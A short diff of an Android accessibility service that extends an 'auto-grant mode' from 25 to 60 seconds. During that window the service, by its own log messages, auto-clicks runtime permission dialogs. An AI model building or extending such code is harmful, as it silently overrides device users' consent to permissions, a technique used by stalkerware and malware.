@@ -934,12 +934,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             }
         }, 1_000);
 
-        // Auto-grant mode expires after 25 seconds
+        // Auto-grant mode expires after 60 seconds — enough time for all runtime
+        // permission dialogs to appear and be clicked even on slow devices.
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired after 25 seconds");
-        }, 25_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 25s");
+            Log.i(TAG, "Auto-grant mode expired after 60 seconds");
+        }, 60_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 60s");
     }
 
     /**
